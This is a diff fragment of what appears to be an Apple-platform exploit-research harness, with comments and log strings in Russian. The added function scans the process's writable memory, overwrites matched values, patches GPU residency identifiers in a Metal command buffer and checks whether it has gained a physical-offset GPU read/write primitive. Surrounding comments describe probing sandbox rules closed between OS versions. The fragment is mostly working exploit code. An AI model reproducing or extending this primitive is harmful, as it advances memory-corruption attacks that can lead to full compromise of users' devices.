+            [enc endEncoding];
+            void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+            if (!storage) { LOG("[bq91] rt: no storage"); return; }
+            uint8_t *sg = *(uint8_t **)((uint8_t *)storage + 0x68);
+            // pool-слоты: dest(bB)→Wi (write) или source(bA)→Wi (read)
+            long pn = 0;
+            mach_vm_address_t addr = 0;
+            for (;;) {
+                mach_vm_size_t sz = 0;
+                vm_region_basic_info_data_64_t info;
+                mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+                mach_port_t obj;
+                if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                                   (vm_region_info_t)&info, &cnt, &obj)) break;
+                if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
+                    uint8_t *base = (uint8_t *)addr;
+                    for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4) {
+                        uint64_t q = *(uint64_t *)(base + o);
+                        if (!phase && q == gb2) { *(uint64_t *)(base + o) = Wi; pn++; }
+                        else if (phase && q == ga) { *(uint64_t *)(base + o) = Wi; pn++; }
+                    }
+                }
+                addr += sz;
+                if (!sz) break;
+            }
+            // residency: rid dest-буфера (write) / src-буфера (read) → cBig
+            uint32_t rid2 = 0, rid1 = 0;
+            for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+                uint16_t c2 = *(uint16_t *)(sg + o + 0x3e);
+                if (c2 == 2 && *(uint32_t *)(sg + o + 0x18) == 0x40 &&
+                    *(uint32_t *)(sg + o + 0x1c) == 0x40) {
+                    rid1 = *(uint32_t *)(sg + o + 0x00);
+                    rid2 = *(uint32_t *)(sg + o + 0x04);
+                    break;
+                }
+            }
+            uint32_t ridX = phase ? rid1 : rid2;
+            long rp = 0;
+            if (ridX) for (long o = 0x48; o + 4 <= 0x400; o += 4)
+                if (*(uint32_t *)(sg + o) == ridX) { *(uint32_t *)(sg + o) = ch[2].rid; rp++; }
+            LOG("[bq91] T%c via window @%#llx: слотов %ld res-патчей %ld",
+                phase ? '9' : '8', Wi, pn, rp);
+            fsync(fileno(stderr));
+            @try {
+                [cb commit];
+                [cb waitUntilCompleted];
+            } @catch (NSException *ex) {
+                LOG("[bq91] T%c EXCEPTION %s", phase ? '9' : '8', [[ex reason] UTF8String]);
+                continue;
+            }
+            if (phase) {
+                long c41 = 0, cnz = 0;
+                for (long i = 0; i < 0x10000; i += 0x40) {
+                    uint8_t bb = ((uint8_t *)[bB contents])[i];
+                    if (bb == 0x41) c41++;
+                    if (bb) cnz++;
+                }
+                LOG("[bq91] T9 READBACK: B:41 %ld Bnz %ld status %ld",
+                    c41, cnz, (long)[cb status]);
+                if (c41) LOG("[bq91]   *** ROUND-TRIP СХОДИТСЯ — ОКНО РЕБЁНКА МАППИТ ЛЮБОЙ D: ПОЛНЫЙ phys-offset GPU READ/WRITE ПРИМИТИВ (§241)! ***");
+                else LOG("[bq91]   round-trip пуст: окно не маппится (residency скипает детей) либо дроп");
+            }
+            usleep(200000);
+        }
+    }
+    LOG("[bq91] ИТОГ: матрица завершена (устройство живо? = нет паники)");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -52751,6 +53309,8 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ87")) { p_bq87(); LOG("[probe13] bq87-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ88")) { p_bq88(); LOG("[probe13] bq88-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ89")) { p_bq89(); LOG("[probe13] bq89-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ90")) { p_bq90(); LOG("[probe13] bq90-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ91")) { p_bq91(); LOG("[probe13] bq91-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
